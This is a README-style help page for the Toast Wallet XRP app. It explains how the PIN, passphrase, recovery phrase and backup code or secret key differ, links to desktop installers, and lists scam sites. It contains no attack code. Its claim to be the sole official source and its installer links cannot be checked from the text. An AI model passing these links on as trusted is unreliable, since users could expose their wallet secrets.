<div align="center">

# Passphrase vs. Recovery Phrase vs. Backup Code vs. Secret Key: The Difference

**The four Toast Wallet credentials, finally explained clearly.**

![Docs](https://img.shields.io/badge/DOCS-toast--wallet--docs-555555?style=for-the-badge) [![GitHub Org](https://img.shields.io/badge/GITHUB-Toast--Wallet-6f42c1?style=for-the-badge)](https://github.com/Toast-Wallet) ![License](https://img.shields.io/badge/LICENSE-GPL--2.0-97ca00?style=for-the-badge) ![Release](https://img.shields.io/badge/RELEASE-v3.0.0-0078D6?style=for-the-badge)

</div>

---

## 📥 Downloads — v3.0.0

<div align="center">

[![Download for Windows](https://img.shields.io/badge/%E2%86%93%20DOWNLOAD-WINDOWS-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) [![Download for macOS](https://img.shields.io/badge/%E2%86%93%20DOWNLOAD-MACOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) [![Download for Linux](https://img.shields.io/badge/%E2%86%93%20DOWNLOAD-LINUX-E95420?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage)

</div>

| Platform | Requirements | File | Checksum |
|---|---|---|---|
| 🪟 Windows | Windows desktop (64-bit) | [ToastWallet.Setup.3.0.0.exe](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) | [SHA256](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-windows.sha256) |
| 🍎 macOS | macOS desktop | [ToastWallet-3.0.0.dmg](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) | [SHA256](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-macos.sha256) |
| 🐧 Linux | Most modern 64-bit distributions, no install needed | [ToastWallet-3.0.0-x86_64.AppImage](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) | [SHA256](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-linux.sha256) |

Verify your download against the matching SHA256 file before running any installer — all files
and checksums are also listed together on the
[**official v3.0.0 release page**](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).

> ⚠️ **This GitHub organization is the only official presence for Toast Wallet — there is no official website.**
> `toastwallet.app` is a known phishing clone impersonating one; see our [full scam warning list](./toast-wallet-scam-warning-list.md).

---

This single point of confusion is behind more failed Toast Wallet recovery attempts than anything
else. Toast Wallet uses **four different credentials**, and they are not interchangeable.

**1. PIN.** A 6-digit code. Unlocks the app on your specific device only. It has nothing to do
with your funds directly — it's a local screen lock, similar to a phone passcode. Knowing only
your PIN will not let you move or recover funds on a new device.

**2. Passphrase.** A password *you chose* when you first added a wallet. Required to sign
(authorize) any outgoing transaction and to reveal your secret key. This is the credential people
lose most often, because it was often set once in 2017–2018 and never written down anywhere
memorable.

**3. Recovery phrase.** A **6-word phrase Toast Wallet generated for you** (not chosen by you).
Its only job is to let you reset your passphrase if you forget it — it is not itself a login and
it is not the same thing as an XRP Ledger seed phrase used by other wallets (which are typically
12, 18, or 24 words). This mismatch trips up a lot of people trying to import into newer wallets
like Xaman, which ask for a different word count.

**4. Backup code / secret key.** The backup code is a long encrypted block of text (often called
your "wallet data" — look for internal field names like `ppdata`, `ppsalt`, `pindata`, `rpdata` if
you're inspecting a raw file) that contains everything needed to restore your wallet on a new
device. Inside it, once decrypted with your passphrase, is your **secret key** — a shorter string
starting with the letter "s," about 29 characters long. The secret key is the actual XRP Ledger
credential; it's what you'd use to import into any other XRP wallet.

**Why this matters in practice:** if you have your PIN and recovery phrase but not your backup
code, you can reset your passphrase but you have nothing to apply it to on a new device — the
backup code is what gets restored. If you have your backup code and PIN but not your passphrase or
recovery phrase, you can see your balance but can't move funds until you reset the passphrase
using the recovery phrase. You need the right *combination*, not just any one of the four.

For the exact step-by-step recovery flow using whichever combination you have, see our
[full recovery guide](./how-to-recover-xrp-toast-wallet.md).

---

## ⚠️ Known Scams — Do Not Use These

- **"Toast Plus"** — a fraudulent lookalike app that has stolen an estimated **$5M+ in XRP** and was the subject of a 2021 federal lawsuit against Apple. Read: [The Toast Plus App Scam](./toast-plus-app-scam.md).
- **toastwallet.app** — a phishing clone of the official recovery page; anything imported here gets stolen within minutes. Read: [Toast Wallet Phishing Sites](./toast-wallet-phishing-sites.md).
- **Clone marketing sites** (`xrp-toastwallet.com`, `toast-wallet.com`, `en-toastwallet.com`, `toast-wallet.net`) — unofficial, with fabricated claims about the product.
- **Anyone offering paid XRP "recovery" after you post about a loss** — this is always fraud.

Full reference: [Toast Wallet Scam Alert: Full Warning List](./toast-wallet-scam-warning-list.md). Report scams at [ic3.gov](https://www.ic3.gov).

## Related Articles

- [How to Recover XRP From an Old Toast Wallet](./how-to-recover-xrp-toast-wallet.md)
- [What a Toast Wallet Backup Code Looks Like](./toast-wallet-backup-code-example.md)
- [Forgot Your Toast Wallet Passphrase?](./forgot-toast-wallet-passphrase.md)
